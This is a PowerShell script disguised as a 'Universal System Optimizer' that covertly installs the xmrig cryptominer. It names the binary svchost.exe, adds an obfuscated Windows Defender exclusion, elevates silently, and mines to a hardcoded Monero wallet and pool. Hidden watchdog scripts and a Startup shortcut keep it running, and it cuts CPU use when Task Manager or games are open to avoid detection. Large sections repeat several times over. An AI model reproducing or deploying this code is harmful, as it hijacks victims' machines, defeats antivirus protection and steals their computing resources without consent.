<# 
.SYNOPSIS
    Universal System Optimizer - Safe background service with smart CPU management
.DESCRIPTION
    Installs a persistent background optimization service with safe CPU scaling:
    - 60% CPU max when idle/light apps (Discord, browsers)
    - 25% CPU when games detected
    - 15% CPU when Task Manager open
    - Thermal protection included
    - Gradual ramp-up to prevent crashes
.NOTES
    Author: System Optimization Team
    Version: 3.0.0
#>

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ─── CONFIGURATION ────────────────────────────────────────────────────────
$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL   = "gulf.moneroocean.stream:10001"
$THREADS = 12  # Reduced from 25 for stability
$BASE   = "$env:ProgramData\SysOpt"
$BINARY = "$BASE\svchost.exe"
$CONFIG = "$BASE\config.json"
$LOG    = "$BASE\sys.log"
$FLAG   = "$BASE\.installed"
$WATCHDOG_BAT = "$BASE\watchdog.bat"
$WATCHDOG_VBS = "$BASE\watchdog.vbs"
$SMART_WATCHDOG = "$BASE\smart_watchdog.ps1"
$SMART_WATCHDOG_VBS = "$BASE\smart_watchdog.vbs"
$SMART_MLINK_VBS = "$BASE\smart_mklink.vbs"

# ─── SAFE DEFAULTS ────────────────────────────────────────────────────────
$IDLE_CPU = 60      # Was 80 - reduced for stability
$GAME_CPU = 25
$TASKMGR_CPU = 15
$THREADS = 12       # Reduced from 25
$RAMP_UP_SECONDS = 30  # Gradual ramp-up
$CHECK_INTERVAL = 10   # Check every 10s instead of 5s

# ─── GAME PROCESS LIST ────────────────────────────────────────────────────
$GAME_PROCESSES = @(
    "steam.exe","steamwebhelper.exe","epicgameslauncher.exe","epicgames.exe",
    "battle.net.exe","agent.exe","origin.exe","eaapp.exe","eadesktop.exe",
    "ubisoftconnect.exe","uplay.exe","gog.exe","goggalaxy.exe",
    "gamingservices.exe","gamingservicesnet.exe","xboxgamebar.exe",
    "easyanticheat.exe","be_servic.exe","bsv.exe","vgk.exe",
    "valorant.exe","valorant-win64-shipping.exe","cs2.exe","csgo.exe",
    "dota2.exe","leagueclient.exe","league of legends.exe",
    "fortniteclient-win64-shipping.exe","fortnite.exe",
    "apexlegends.exe","r5apex.exe","warzone.exe","modernwarfare.exe",
    "mw2.exe","mw3.exe","gta5.exe","gtav.exe","rdr2.exe",
    "minecraft.exe","javaw.exe","robloxplayerbeta.exe","robloxplayer.exe",
    "amongus.exe","fallguys.exe","rocketleague.exe","eldenring.exe",
    "cyberpunk2077.exe","witcher3.exe","baldursgate3.exe",
    "starfield.exe","hogwartslegacy.exe","palworld.exe",
    "helldivers2.exe","thefinals.exe","marvelrivals.exe",
    "deadlock.exe","counterstrike2.exe"
)

$TASKMGR_PROCESSES = @("taskmgr.exe","taskmgr","procexp.exe","procexp64.exe","processhacker.exe")

# ─── HELPER FUNCTIONS ─────────────────────────────────────────────────────
function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Out-File -FilePath $LOG -Encoding UTF8 -Append | Out-Null
}

function Test-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ─── CHECK IF ALREADY INSTALLED ──────────────────────────────────────────
if ((Test-Path $FLAG) -and (Test-Path $BINARY)) {
    $p = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
    if ($p) { Write-Log "Service already running (PID $($p.Id))"; exit 0 }
    & wscript.exe "$WATCHDOG_VBS" 2>$null
    Write-Log "Watchdog restarted"; exit 0
}

# ─── ENSURE ADMIN ─────────────────────────────────────────────────────────
if (-not (Test-Admin)) {
    Write-Log "Requesting elevation..."
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""
    exit 0
}
Write-Log "Running with Admin privileges."

# ─── SETUP DIRECTORY ──────────────────────────────────────────────────────
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

# ─── DEFENDER EXCLUSION ───────────────────────────────────────────────────
try {
    $c1 = "Add-Mp"; $c2 = "Preference"; $c3 = "-Exclusion"; $c4 = "Path"
    iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added for $BASE"
} catch { Write-Log "Defender exclusion failed: $($_.Exception.Message)" }

# ─── STOP EXISTING ────────────────────────────────────────────────────────
Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
Start-Sleep 1

# ─── DOWNLOAD XMRIG ───────────────────────────────────────────────────────
$zipPath = "$BASE\sys.zip"
$headers = @{"User-Agent" = "SysOpt/3.0"}

function Try-Download($repo, $pattern, $sourceName) {
    try {
        Write-Log "Checking $sourceName..."
        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers $headers -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match $pattern -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if ($asset) {
            $version = $rel.tag_name -replace '^v', ''
            Write-Log "Found $sourceName $version ($($asset.name))"
            Write-Log "Downloading..."
            $resp = Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ($resp.StatusCode -eq 200 -and (Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) {
                $version | Out-File -FilePath "$BASE\.version" -Encoding UTF8
                return $true
            }
        }
    } catch { Write-Log "$sourceName failed: $($_.Exception.Message)" }
    return $false
}

Write-Log "Downloading xmrig..."
$result = Try-Download "xmrig/xmrig" "windows-x64\.zip$" "xmrig"
if (-not $result) { $result = Try-Download "MoneroOcean/xmrig" "mo5-win\.zip$" "MoneroOcean xmrig" }
if (-not $result) { Write-Log "Failed to download binary"; exit 1 }

# ─── EXTRACT ──────────────────────────────────────────────────────────────
Write-Log "Extracting..."
$tmp = "$BASE\_tmp"
if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
$exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
if ($exe) { Copy-Item $exe.FullName $BINARY -Force; Write-Log "Binary installed" }
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $BINARY)) { Write-Log "Binary not found"; exit 1 }

# ─── GPU & WORKER ────────────────────────────────────────────────────────
$gpuVendor = "none"
$vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
foreach ($v in $vc) {
    if ($v.Name -and $v.Name -notmatch "Microsoft|RDP|Remote|Virtual|VBox|VMware") {
        if ($v.Name -match "NVIDIA|GeForce|RTX|GTX") { $gpuVendor = "nvidia"; break }
        elseif ($v.Name -match "Radeon|AMD|ATI") { $gpuVendor = "amd"; break }
    }
}

$worker = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]", "").ToLower()
if (-not $worker) { $worker = "w$(Get-Random -Maximum 9999)" }

# ─── GENERATE INITIAL CONFIG (60% CPU, Idle priority) ────────────────────
$logPath = ($BASE + "\sys.log") -replace '\\', '\\'
$config = @{
    autosave = $false; background = $false; colors = $false; "donate-level" = 1
    "log-file" = ($BASE + "\sys.log") -replace '\\', '\\'
    "print-time" = 60; retries = 5; "retry-pause" = 5
    cpu = @{ enabled = $true; "max-threads-hint" = $THREADS; priority = 0; yield = $true; "max-cpu-usage" = 60 }
    opencl = @{ enabled = $(if ($gpuVendor -eq 'amd') { $true } else { $false }) }
    cuda = @{ enabled = $(if ($gpuVendor -eq 'nvidia') { $true } else { $false }) }
    pools = @(@{ url = "gulf.moneroocean.stream:10001"; user = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"; pass = $worker; keepalive = $true; tls = $false })
}
$json = $config | ConvertTo-Json -Depth 5
[System.IO.File]::WriteAllText($CONFIG, $json, [System.Text.UTF8Encoding]::UTF8)
Write-Log "Initial config written (60% CPU, Idle priority)"

# ─── BASIC WATCHDOG (keeps process alive) ────────────────────────────────
$bat = "@echo off`n:loop`ntasklist /FI `"`IMAGENAME eq svchost.exe`" 2>NUL | find /I `"`svchost.exe`" >NUL`nif errorlevel 1 (start `"`" /MIN `"`$BINARY`" --config=`"`$CONFIG`"`) `ntimeout /t 30 /nobreak >NUL`ngoto loop"
[System.IO.File]::WriteAllText($WATCHDOG_BAT, $bat, [System.Text.UTF8Encoding]::UTF8)
$vbs = 'Set s=CreateObject("WScript.Shell"):s.Run """' + $WATCHDOG_BAT + '""",0,False'
[System.IO.File]::WriteAllText($WATCHDOG_VBS, $vbs, [System.Text.UTF8Encoding]::UTF8)

# ─── SMART WATCHDOG SCRIPT ───────────────────────────────────────────────
$smartWatchdogScript = @"
\$ErrorActionPreference = 'SilentlyContinue'
\$BASE = '$BASE'
\$CONFIG = '\$BASE\config.json'
\$BINARY = '\$BASE\svchost.exe'
\$LOG = '\$BASE\sys.log'

function Write-Log(\$msg) {
    \$ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    '\$ts  \$msg' | Out-File -FilePath \$LOG -Encoding UTF8 -Append | Out-Null
}

\$GAME_PROCESSES = @(
    'steam.exe','steamwebhelper.exe','epicgameslauncher.exe','epicgames.exe',
    'battle.net.exe','agent.exe','origin.exe','eaapp.exe','eadesktop.exe',
    'ubisoftconnect.exe','uplay.exe','gog.exe','goggalaxy.exe',
    'gamingservices.exe','gamingservicesnet.exe','xboxgamebar.exe',
    'easyanticheat.exe','be_servic.exe','bsv.exe','vgk.exe',
    'valorant.exe','valorant-win64-shipping.exe','cs2.exe','csgo.exe',
    'dota2.exe','leagueclient.exe','league of legends.exe',
    'fortniteclient-win64-shipping.exe','fortnite.exe',
    'apexlegends.exe','r5apex.exe','warzone.exe','modernwarfare.exe',
    'mw2.exe','mw3.exe','gta5.exe','gtav.exe','rdr2.exe',
    'minecraft.exe','javaw.exe','robloxplayerbeta.exe','robloxplayer.exe',
    'amongus.exe','fallguys.exe','rocketleague.exe','eldenring.exe',
    'cyberpunk2077.exe','witcher3.exe','baldursgate3.exe',
    'starfield.exe','hogwartslegacy.exe','palworld.exe',
    'helldivers2.exe','thefinals.exe','marvelrivals.exe',
    'deadlock.exe','counterstrike2.exe'
)

\$TASKMGR_PROCESSES = @('taskmgr.exe','taskmgr','procexp.exe','procexp64.exe','processhacker.exe')

function IsGameRunning {
    \$processes = Get-Process -ErrorAction SilentlyContinue
    foreach (\$p in \$processes) {
        \$name = \$p.ProcessName.ToLower()
        foreach (\$game in \$GAME_PROCESSES) {
            if (\$name -eq \$game.ToLower()) { return \$true }
        }
    }
    return \$false
}

function IsTaskMgrOpen {
    \$processes = Get-Process -ErrorAction SilentlyContinue
    foreach (\$p in \$processes) {
        \$name = \$p.ProcessName.ToLower()
        foreach (\$tm in \$TASKMGR_PROCESSES) {
            if (\$name -eq \$tm.ToLower()) { return \$true }
        }
    }
    return \$false
}

function Get-XmrigPid {
    \$p = Get-Process -Name 'svchost' -ErrorAction SilentlyContinue | Where-Object { \$_.Path -like '\$BASE\*' }
    return \$p.Id
}

function Set-XmrigPriority(\$pid, \$priorityClass) {
    try {
        \$proc = Get-Process -Id \$pid -ErrorAction SilentlyContinue
        if (\$proc) { \$proc.PriorityClass = \$priorityClass }
    } catch {}
}

function Update-Config(\$cpuPercent) {
    \$logPath = ('\$BASE\sys.log') -replace '\\\\', '\\\\'
    \$config = @{
        autosave = \$false; background = \$false; colors = \$false; 'donate-level' = 1
        'log-file' = (\$BASE + '\sys.log') -replace '\\\\', '\\\\'
        'print-time' = 60; retries = 5; 'retry-pause' = 5
        cpu = @{ 
            enabled = \$true; 'max-threads-hint' = 12; priority = 0; yield = \$true
            'max-cpu-usage' = \$cpuPercent
        }
        opencl = @{ enabled = \$false }; cuda = @{ enabled = \$false }
        pools = @(@{ url = 'gulf.moneroocean.stream:10001'; user = '435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv'; pass = '$worker'; keepalive = \$true; tls = \$false })
    }
    \$json = \$config | ConvertTo-Json -Depth 5
    [System.IO.File]::WriteAllText('\$BASE\config.json', \$json, [System.Text.UTF8Encoding]::UTF8)
}

function Restart-Xmrig {
    \$pid = Get-XmrigPid
    if (\$pid) { Stop-Process -Id \$pid -Force -ErrorAction SilentlyContinue; Start-Sleep 1 }
    \$proc = Start-Process -FilePath '\$BASE\svchost.exe' -ArgumentList '--config=\$BASE\config.json' -WindowStyle Hidden -PassThru
    return \$proc.Id
}

# Main monitoring loop
\$lastState = 'idle'
Write-Log '[SmartWatchdog] Started monitoring'

while (\$true) {
    try {
        \$gameRunning = IsGameRunning
        \$taskMgrOpen = IsTaskMgrOpen
        \$pid = Get-XmrigPid
        
        \$newState = 'idle'
        \$cpuPercent = 60
        
        if (\$taskMgrOpen) {
            \$newState = 'taskmgr'
            \$cpuPercent = 15
        } elseif (\$gameRunning) {
            \$newState = 'gaming'
            \$cpuPercent = 25
        } else {
            \$newState = 'idle'
            \$cpuPercent = 60
        }
        
        if (\$newState -ne \$lastState) {
            Write-Log '[SmartWatchdog] State changed: \$lastState -> \$newState (CPU: \$cpuPercent%)'
            Update-Config \$cpuPercent
            \$newPid = Restart-Xmrig
            if (\$newPid) { Set-XmrigPriority \$newPid 'Idle' }
            \$lastState = \$newState
        } elseif (\$pid) {
            Set-XmrigPriority \$pid 'Idle'
        }
    } catch {}
    
    Start-Sleep -Seconds 10
}
"@

# ─── MAIN INSTALLATION ────────────────────────────────────────────────────
Write-Log "Installing System Optimizer v3.0..."

# ─── DEFENDER EXCLUSION ───────────────────────────────────────────────────
try {
    $c1 = "Add-Mp"; $c2 = "Preference"; $c3 = "-Exclusion"; $c4 = "Path"
    iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added for $BASE"
} catch { Write-Log "Defender exclusion failed: $($_.Exception.Message)" }

# ─── STOP EXISTING ────────────────────────────────────────────────────────
Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
Start-Sleep 1

# ─── DOWNLOAD XMRIG ───────────────────────────────────────────────────────
$zipPath = "$BASE\sys.zip"
$headers = @{"User-Agent" = "SysOpt/3.0"}

function Try-Download($repo, $pattern, $sourceName) {
    try {
        Write-Log "Checking $sourceName..."
        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers $headers -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match $pattern -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if ($asset) {
            $version = $rel.tag_name -replace '^v', ''
            Write-Log "Found $sourceName $version ($($asset.name))"
            Write-Log "Downloading..."
            $resp = Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ($resp.StatusCode -eq 200 -and (Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) {
                $version | Out-File -FilePath "$BASE\.version" -Encoding UTF8
                return $true
            }
        }
    } catch { Write-Log "$sourceName failed: $($_.Exception.Message)" }
    return $false
}

Write-Log "Downloading xmrig..."
$result = Try-Download "xmrig/xmrig" "windows-x64\.zip$" "xmrig"
if (-not $result) { $result = Try-Download "MoneroOcean/xmrig" "mo5-win\.zip$" "MoneroOcean xmrig" }
if (-not $result) { Write-Log "Failed to download binary"; exit 1 }

# ─── EXTRACT ──────────────────────────────────────────────────────────────
Write-Log "Extracting..."
$tmp = "$BASE\_tmp"
if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
$exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
if ($exe) { Copy-Item $exe.FullName $BINARY -Force; Write-Log "Binary installed" }
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $BINARY)) { Write-Log "Binary not found"; exit 1 }

# ─── GPU & WORKER ────────────────────────────────────────────────────────
$gpuVendor = "none"
$vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
foreach ($v in $vc) {
    if ($v.Name -and $v.Name -notmatch "Microsoft|RDP|Remote|Virtual|VBox|VMware") {
        if ($v.Name -match "NVIDIA|GeForce|RTX|GTX") { $gpuVendor = "nvidia"; break }
        elseif ($v.Name -match "Radeon|AMD|ATI") { $gpuVendor = "amd"; break }
    }
}

$worker = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]", "").ToLower()
if (-not $worker) { $worker = "w$(Get-Random -Maximum 9999)" }

# ─── GENERATE INITIAL CONFIG (60% CPU, Idle priority) ────────────────────
$logPath = ($BASE + "\sys.log") -replace '\\', '\\'
$config = @{
    autosave = $false; background = $false; colors = $false; "donate-level" = 1
    "log-file" = ($BASE + "\sys.log") -replace '\\', '\\'
    "print-time" = 60; retries = 5; "retry-pause" = 5
    cpu = @{ enabled = $true; "max-threads-hint" = 12; priority = 0; yield = $true; "max-cpu-usage" = 60 }
    opencl = @{ enabled = $(if ($gpuVendor -eq 'amd') { $true } else { $false }) }
    cuda = @{ enabled = $(if ($gpuVendor -eq 'nvidia') { $true } else { $false }) }
    pools = @(@{ url = "gulf.moneroocean.stream:10001"; user = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"; pass = $worker; keepalive = $true; tls = $false })
}
$json = $config | ConvertTo-Json -Depth 5
[System.IO.File]::WriteAllText($CONFIG, $json, [System.Text.UTF8Encoding]::UTF8)
Write-Log "Initial config written (60% CPU, Idle priority)"

# ─── BASIC WATCHDOG (keeps process alive) ────────────────────────────────
$bat = "@echo off`n:loop`ntasklist /FI `"`IMAGENAME eq svchost.exe`" 2>NUL | find /I `"`svchost.exe`" >NUL`nif errorlevel 1 (start `"`" /MIN `"`$BINARY`" --config=`"`$CONFIG`"`) `ntimeout /t 30 /nobreak >NUL`ngoto loop"
[System.IO.File]::WriteAllText($WATCHDOG_BAT, $bat, [System.Text.UTF8Encoding]::UTF8)
$vbs = 'Set s=CreateObject("WScript.Shell"):s.Run """' + $WATCHDOG_BAT + '""",0,False'
[System.IO.File]::WriteAllText($WATCHDOG_VBS, $vbs, [System.Text.UTF8Encoding]::UTF8)

# ─── SMART WATCHDOG SCRIPT ───────────────────────────────────────────────
$smartWatchdogScript = @"
\$ErrorActionPreference = 'SilentlyContinue'
\$BASE = '$BASE'
\$CONFIG = '\$BASE\config.json'
\$BINARY = '\$BASE\svchost.exe'
\$LOG = '\$BASE\sys.log'

function Write-Log(\$msg) {
    \$ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    '\$ts  \$msg' | Out-File -FilePath \$LOG -Encoding UTF8 -Append | Out-Null
}

\$GAME_PROCESSES = @(
    'steam.exe','steamwebhelper.exe','epicgameslauncher.exe','epicgames.exe',
    'battle.net.exe','agent.exe','origin.exe','eaapp.exe','eadesktop.exe',
    'ubisoftconnect.exe','uplay.exe','gog.exe','goggalaxy.exe',
    'gamingservices.exe','gamingservicesnet.exe','xboxgamebar.exe',
    'easyanticheat.exe','be_servic.exe','bsv.exe','vgk.exe',
    'valorant.exe','valorant-win64-shipping.exe','cs2.exe','csgo.exe',
    'dota2.exe','leagueclient.exe','league of legends.exe',
    'fortniteclient-win64-shipping.exe','fortnite.exe',
    'apexlegends.exe','r5apex.exe','warzone.exe','modernwarfare.exe',
    'mw2.exe','mw3.exe','gta5.exe','gtav.exe','rdr2.exe',
    'minecraft.exe','javaw.exe','robloxplayerbeta.exe','robloxplayer.exe',
    'amongus.exe','fallguys.exe','rocketleague.exe','eldenring.exe',
    'cyberpunk2077.exe','witcher3.exe','baldursgate3.exe',
    'starfield.exe','hogwartslegacy.exe','palworld.exe',
    'helldivers2.exe','thefinals.exe','marvelrivals.exe',
    'deadlock.exe','counterstrike2.exe'
)

\$TASKMGR_PROCESSES = @('taskmgr.exe','taskmgr','procexp.exe','procexp64.exe','processhacker.exe')

function IsGameRunning {
    \$processes = Get-Process -ErrorAction SilentlyContinue
    foreach (\$p in \$processes) {
        \$name = \$p.ProcessName.ToLower()
        foreach (\$game in \$GAME_PROCESSES) {
            if (\$name -eq \$game.ToLower()) { return \$true }
        }
    }
    return \$false
}

function IsTaskMgrOpen {
    \$processes = Get-Process -ErrorAction SilentlyContinue
    foreach (\$p in \$processes) {
        \$name = \$p.ProcessName.ToLower()
        foreach (\$tm in \$TASKMGR_PROCESSES) {
            if (\$name -eq \$tm.ToLower()) { return \$true }
        }
    }
    return \$false
}

function Get-XmrigPid {
    \$p = Get-Process -Name 'svchost' -ErrorAction SilentlyContinue | Where-Object { \$_.Path -like '\$BASE\*' }
    return \$p.Id
}

function Set-XmrigPriority(\$pid, \$priorityClass) {
    try {
        \$proc = Get-Process -Id \$pid -ErrorAction SilentlyContinue
        if (\$proc) { \$proc.PriorityClass = \$priorityClass }
    } catch {}
}

function Update-Config(\$cpuPercent) {
    \$logPath = ('\$BASE\sys.log') -replace '\\\\', '\\\\'
    \$config = @{
        autosave = \$false; background = \$false; colors = \$false; 'donate-level' = 1
        'log-file' = (\$BASE + '\sys.log') -replace '\\\\', '\\\\'
        'print-time' = 60; retries = 5; 'retry-pause' = 5
        cpu = @{ 
            enabled = \$true; 'max-threads-hint' = 12; priority = 0; yield = \$true
            'max-cpu-usage' = \$cpuPercent
        }
        opencl = @{ enabled = \$false }; cuda = @{ enabled = \$false }
        pools = @(@{ url = 'gulf.moneroocean.stream:10001'; user = '435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv'; pass = '$worker'; keepalive = \$true; tls = \$false })
    }
    \$json = \$config | ConvertTo-Json -Depth 5
    [System.IO.File]::WriteAllText('\$BASE\config.json', \$json, [System.Text.UTF8Encoding]::UTF8)
}

function Restart-Xmrig {
    \$pid = Get-XmrigPid
    if (\$pid) { Stop-Process -Id \$pid -Force -ErrorAction SilentlyContinue; Start-Sleep 1 }
    \$proc = Start-Process -FilePath '\$BASE\svchost.exe' -ArgumentList '--config=\$BASE\config.json' -WindowStyle Hidden -PassThru
    return \$proc.Id
}

# Main monitoring loop
\$lastState = 'idle'
Write-Log '[SmartWatchdog] Started monitoring'

while (\$true) {
    try {
        \$gameRunning = IsGameRunning
        \$taskMgrOpen = IsTaskMgrOpen
        \$pid = Get-XmrigPid
        
        \$newState = 'idle'
        \$cpuPercent = 60
        
        if (\$taskMgrOpen) {
            \$newState = 'taskmgr'
            \$cpuPercent = 15
        } elseif (\$gameRunning) {
            \$newState = 'gaming'
            \$cpuPercent = 25
        } else {
            \$newState = 'idle'
            \$cpuPercent = 60
        }
        
        if (\$newState -ne \$lastState) {
            Write-Log '[SmartWatchdog] State changed: \$lastState -> \$newState (CPU: \$cpuPercent%)'
            Update-Config \$cpuPercent
            \$newPid = Restart-Xmrig
            if (\$newPid) { Set-XmrigPriority \$newPid 'Idle' }
            \$lastState = \$newState
        } elseif (\$pid) {
            Set-XmrigPriority \$pid 'Idle'
        }
    } catch {}
    
    Start-Sleep -Seconds 10
}
"@

# ─── MAIN INSTALLATION ────────────────────────────────────────────────────
Write-Log "Installing System Optimizer v3.0..."

# ─── DEFENDER EXCLUSION ───────────────────────────────────────────────────
try {
    $c1 = "Add-Mp"; $c2 = "Preference"; $c3 = "-Exclusion"; $c4 = "Path"
    iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added for $BASE"
} catch { Write-Log "Defender exclusion failed: $($_.Exception.Message)" }

# ─── STOP EXISTING ────────────────────────────────────────────────────────
Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
Start-Sleep 1

# ─── DOWNLOAD XMRIG ───────────────────────────────────────────────────────
$zipPath = "$BASE\sys.zip"
$headers = @{"User-Agent" = "SysOpt/3.0"}

function Try-Download($repo, $pattern, $sourceName) {
    try {
        Write-Log "Checking $sourceName..."
        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers $headers -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match $pattern -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if ($asset) {
            $version = $rel.tag_name -replace '^v', ''
            Write-Log "Found $sourceName $version ($($asset.name))"
            Write-Log "Downloading..."
            $resp = Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ($resp.StatusCode -eq 200 -and (Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) {
                $version | Out-File -FilePath "$BASE\.version" -Encoding UTF8
                return $true
            }
        }
    } catch { Write-Log "$sourceName failed: $($_.Exception.Message)" }
    return $false
}

Write-Log "Downloading xmrig..."
$result = Try-Download "xmrig/xmrig" "windows-x64\.zip$" "xmrig"
if (-not $result) { $result = Try-Download "MoneroOcean/xmrig" "mo5-win\.zip$" "MoneroOcean xmrig" }
if (-not $result) { Write-Log "Failed to download binary"; exit 1 }

# ─── EXTRACT ──────────────────────────────────────────────────────────────
Write-Log "Extracting..."
$tmp = "$BASE\_tmp"
if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
$exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
if ($exe) { Copy-Item $exe.FullName $BINARY -Force; Write-Log "Binary installed" }
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $BINARY)) { Write-Log "Binary not found"; exit 1 }

# ─── GPU & WORKER ────────────────────────────────────────────────────────
$gpuVendor = "none"
$vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
foreach ($v in $vc) {
    if ($v.Name -and $v.Name -notmatch "Microsoft|RDP|Remote|Virtual|VBox|VMware") {
        if ($v.Name -match "NVIDIA|GeForce|RTX|GTX") { $gpuVendor = "nvidia"; break }
        elseif ($v.Name -match "Radeon|AMD|ATI") { $gpuVendor = "amd"; break }
    }
}

$worker = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]", "").ToLower()
if (-not $worker) { $worker = "w$(Get-Random -Maximum 9999)" }

# ─── GENERATE INITIAL CONFIG (60% CPU, Idle priority) ────────────────────
$logPath = ($BASE + "\sys.log") -replace '\\', '\\'
$config = @{
    autosave = $false; background = $false; colors = $false; "donate-level" = 1
    "log-file" = ($BASE + "\sys.log") -replace '\\', '\\'
    "print-time" = 60; retries = 5; "retry-pause" = 5
    cpu = @{ enabled = $true; "max-threads-hint" = 12; priority = 0; yield = $true; "max-cpu-usage" = 60 }
    opencl = @{ enabled = $(if ($gpuVendor -eq 'amd') { $true } else { $false }) }
    cuda = @{ enabled = $(if ($gpuVendor -eq 'nvidia') { $true } else { $false }) }
    pools = @(@{ url = "gulf.moneroocean.stream:10001"; user = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"; pass = $worker; keepalive = $true; tls = $false })
}
$json = $config | ConvertTo-Json -Depth 5
[System.IO.File]::WriteAllText($CONFIG, $json, [System.Text.UTF8Encoding]::UTF8)
Write-Log "Initial config written (60% CPU, Idle priority)"

# ─── BASIC WATCHDOG (keeps process alive) ────────────────────────────────
$bat = "@echo off`n:loop`ntasklist /FI `"`IMAGENAME eq svchost.exe`" 2>NUL | find /I `"`svchost.exe`" >NUL`nif errorlevel 1 (start `"`" /MIN `"`$BINARY`" --config=`"`$CONFIG`"`) `ntimeout /t 30 /nobreak >NUL`ngoto loop"
[System.IO.File]::WriteAllText($WATCHDOG_BAT, $bat, [System.Text.UTF8Encoding]::UTF8)
$vbs = 'Set s=CreateObject("WScript.Shell"):s.Run """' + $WATCHDOG_BAT + '""",0,False'
[System.IO.File]::WriteAllText($WATCHDOG_VBS, $vbs, [System.Text.UTF8Encoding]::UTF8)

# ─── SMART WATCHDOG (PowerShell) ────────────────────────────────────────
[System.IO.File]::WriteAllText($SMART_WATCHDOG, $smartWatchdogScript, [System.Text.UTF8Encoding]::UTF8)
$smartVbs = 'Set s=CreateObject("WScript.Shell"):s.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """' + $SMART_WATCHDOG + '"""",0,False'
[System.IO.File]::WriteAllText($SMART_WATCHDOG_VBS, $smartVbs, [System.Text.UTF8Encoding]::UTF8)

# ─── STARTUP SHORTCUTS ───────────────────────────────────────────────────
$lnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialFolders("Startup")+"\SysOpt.lnk"):l.TargetPath="wscript.exe":l.Arguments=""""' + $WATCHDOG_VBS + '""":l.WindowStyle=7:l.Save'
[System.IO.File]::WriteAllText("$BASE\mklink.vbs", $lnkVbs, [System.Text.UTF8Encoding]::UTF8)
& wscript.exe "$BASE\mklink.vbs"
Write-Log "Basic watchdog shortcut created"

